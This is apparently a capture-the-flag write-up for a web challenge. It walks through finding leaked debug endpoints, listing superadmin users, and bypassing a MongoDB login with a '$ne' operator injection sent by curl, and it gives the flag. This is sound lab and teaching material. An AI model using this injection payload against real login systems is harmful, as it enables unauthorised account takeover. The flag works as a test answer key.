# SecureAuth

**Category:** Web  **Author:** N1sh

Source: `nosql-injection-challenge/`. Run: `cd nosql-injection-challenge && docker build -t web_n1sh_4 . && docker run -p 3001:3000 web_n1sh_4` (MongoDB runs inside the same container and gets seeded on start).

## Solution

The landing page is just a login form, but the HTML comments and `robots.txt` both leak dev endpoints:

```
curl http://localhost:3001/robots.txt
curl http://localhost:3001/api/auth/debug
```

`/api/auth/users` with no parameters prints usage, including the example `?department=security&role=superadmin`. That's the hint: logging in as a normal admin only gets you "you need SUPERADMIN privileges, try targeting: sysadmin, root". Enumerate the superadmins:

```
curl 'http://localhost:3001/api/auth/users?role=superadmin'
```

which gives `sysadmin` and `root`. Their passwords are long and random, but the login handler passes the request body straight into `collection.findOne({username, password})` using the raw driver, so Mongoose sanitisation never happens. Send an operator instead of a string:

```
curl -X POST http://localhost:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"sysadmin","password":{"$ne":""}}'
```

The response JSON contains the flag. `$gt` or `$regex` work just as well. `{"username":{"$ne":""},...}` alone isn't enough because it matches the first user in the collection, who is not a superadmin.

Flag: `H7CTF{n05ql_1nj3ct10n_15_d4ng3r0u5_<uuid>}` (UUID generated per container)
